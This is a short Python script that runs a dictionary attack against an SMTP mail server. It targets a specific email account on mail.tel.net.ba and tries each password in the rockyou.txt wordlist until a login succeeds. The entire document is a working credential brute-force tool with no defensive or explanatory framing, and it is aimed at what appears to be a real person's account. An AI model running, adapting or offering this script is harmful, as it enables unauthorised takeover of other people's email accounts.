import smtplib

smptserver = smtplib.SMTP("mail.tel.net.ba",587)
smptserver.ehlo()
smptserver.starttls()

user = "ziva.crkva@tel.net.ba"
worldlist = open("rockyou.txt","r")

for password in worldlist:
	try:
		smptserver.login(user,password)
		print("[+] Password found !!!" + password)
		break;
	except smtplib.SMTPAuthenticationError:
		print("[-] password incorrect: " + password)
